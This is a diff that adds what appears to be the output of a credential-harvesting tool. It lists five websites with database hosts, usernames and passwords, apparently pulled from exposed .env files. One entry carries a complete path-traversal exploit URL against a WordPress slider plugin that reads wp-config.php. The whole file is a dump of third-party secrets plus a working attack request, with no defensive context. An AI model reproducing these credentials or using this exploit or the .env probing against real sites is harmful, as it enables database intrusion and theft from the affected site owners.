@@ -1,0 +1,30 @@
+ TargetDB = theparq.com//.env
+ Host:  localhost
+ user:  zp10523_theparq
+ pass:  2Bfj69ie5*
+ DB:    zp10523_theparq
+---------------------
+ TargetDB = visionarywritings.com//.env
+ Host:  visionarywritings-do-user-6336270-0.db.ondigitalocean.com
+ user:  visionarywritings
+ pass:  rkvjibjdwnd66ky6
+ DB:    vw
+---------------------
+Full Config Path  : http://coppercoast.biz//wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
+ Host:  localhost
+ user:  copco14_wrdp1
+ pass:  8FcgdYYHZst1
+ DB:    copco14_wrdp1
+---------------------
+ TargetDB = uditsolutions.in//.env
+ Host:  127.0.0.1
+ user:  root
+ pass:  
+ DB:    omra
+---------------------
+ TargetDB = citscape.com/.env
+ Host:  127.0.0.1
+ user:  root
+ pass:  
+ DB:    laravel
+---------------------
